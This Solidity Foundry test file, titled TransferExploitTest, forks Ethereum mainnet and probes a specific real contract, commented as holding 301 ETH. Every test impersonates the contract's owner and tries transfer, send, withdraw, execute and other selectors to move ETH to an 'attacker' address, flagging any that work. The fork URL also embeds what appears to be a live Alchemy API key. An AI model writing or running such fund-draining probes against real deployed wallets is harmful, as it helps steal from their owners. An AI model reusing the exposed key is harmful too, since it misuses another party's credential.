// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract TransferExploitTest is Test {
    address constant TARGET = 0xbd6eD4969D9e52032eE3573e643f6a1bdC0a7E1E; // 301 ETH
    address constant OWNER = 0xC8668bF0A13eFa2D508642006fb4965878cA1fd9;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
    }

    function test_transferFunction() public {
        console.log("=== TRANSFER FUNCTION TEST ===");
        console.log("Target balance:", TARGET.balance / 1e18, "ETH");

        uint256 attackerBefore = attacker.balance;

        // Try transfer as owner
        vm.prank(OWNER);
        (bool success, bytes memory ret) = TARGET.call(
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 1 ether)
        );

        console.log("Transfer call success:", success);
        console.log("Return value:", ret.length > 0 ? abi.decode(ret, (bool)) : false);
        console.log("Attacker received:", (attacker.balance - attackerBefore) / 1e15, "finney");

        if (attacker.balance > attackerBefore) {
            console.log("!!! TRANSFER WORKS !!!");
        }
    }

    function test_sendFunction() public {
        console.log("=== SEND FUNCTION TEST ===");

        uint256 attackerBefore = attacker.balance;

        vm.prank(OWNER);
        (bool success,) = TARGET.call(
            abi.encodeWithSignature("send(address,uint256)", attacker, 1 ether)
        );
        console.log("send() success:", success);
        console.log("Attacker received:", (attacker.balance - attackerBefore) / 1e15, "finney");
    }

    function test_directTransferTo() public {
        console.log("=== DIRECT TRANSFER TEST ===");

        // Try calling the contract's fallback with value to trigger a send
        uint256 attackerBefore = attacker.balance;

        vm.prank(OWNER);
        (bool success,) = TARGET.call{gas: 100000}(
            abi.encodeWithSignature("transferTo(address,uint256)", attacker, 1 ether)
        );
        console.log("transferTo() success:", success);

        vm.prank(OWNER);
        TARGET.call(
            abi.encodeWithSignature("withdraw(address,uint256)", attacker, 1 ether)
        );

        vm.prank(OWNER);
        TARGET.call(
            abi.encodeWithSignature("sendETH(address,uint256)", attacker, 1 ether)
        );

        console.log("Attacker received:", (attacker.balance - attackerBefore) / 1e15, "finney");
    }

    function test_checkAllWalletFunctions() public {
        console.log("=== CHECKING ALL WALLET FUNCTIONS ===");
        console.log("Target balance:", TARGET.balance / 1e18, "ETH");

        // Check if owner has the key to this wallet
        (bool s, bytes memory d) = TARGET.staticcall(abi.encodeWithSignature("getOwner(uint256)", 0));
        if (s && d.length >= 32) {
            address owner0 = abi.decode(d, (address));
            console.log("Owner 0:", owner0);
        }

        (s, d) = TARGET.staticcall(abi.encodeWithSignature("getOwner(uint256)", 1));
        if (s && d.length >= 32) {
            address owner1 = abi.decode(d, (address));
            console.log("Owner 1:", owner1);
        }

        // Check all withdrawal-like functions
        bytes4[12] memory sigs = [
            bytes4(keccak256("transfer(address,uint256)")),
            bytes4(keccak256("send(address,uint256)")),
            bytes4(keccak256("sendTo(address,uint256)")),
            bytes4(keccak256("transferTo(address,uint256)")),
            bytes4(keccak256("withdraw(uint256)")),
            bytes4(keccak256("withdraw(address,uint256)")),
            bytes4(keccak256("withdrawTo(address,uint256)")),
            bytes4(keccak256("pay(address,uint256)")),
            bytes4(keccak256("payout(address,uint256)")),
            bytes4(keccak256("claim(address,uint256)")),
            bytes4(keccak256("release(address,uint256)")),
            bytes4(keccak256("execute(address,uint256,bytes)"))
        ];

        for (uint i = 0; i < sigs.length; i++) {
            uint256 before = attacker.balance;

            vm.prank(OWNER);
            TARGET.call(abi.encodeWithSelector(sigs[i], attacker, 0.1 ether));

            vm.prank(OWNER);
            TARGET.call(abi.encodeWithSelector(sigs[i], attacker, 0.1 ether, ""));

            if (attacker.balance > before) {
                console.log("!!! FOUND WORKING FUNCTION at index:", i);
                console.log("Received:", (attacker.balance - before) / 1e15, "finney");
                return;
            }
        }

        console.log("No direct withdrawal function found");
    }
}
